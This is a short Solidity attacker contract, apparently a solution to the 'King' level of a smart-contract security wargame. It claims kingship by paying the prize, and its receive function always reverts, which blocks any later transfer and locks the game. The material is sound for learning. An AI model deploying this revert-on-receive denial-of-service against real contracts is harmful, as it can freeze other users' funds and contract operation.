// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@levels/King.sol";

contract Attacker {
    King public target;

    constructor(address _target) payable {
        target = King(payable(_target));
    }

    receive() external payable {
        revert("Don't you dare beat me!");
    }

    function exploit() public payable {
        address(target).call{value: target.prize()}("");
    }
}
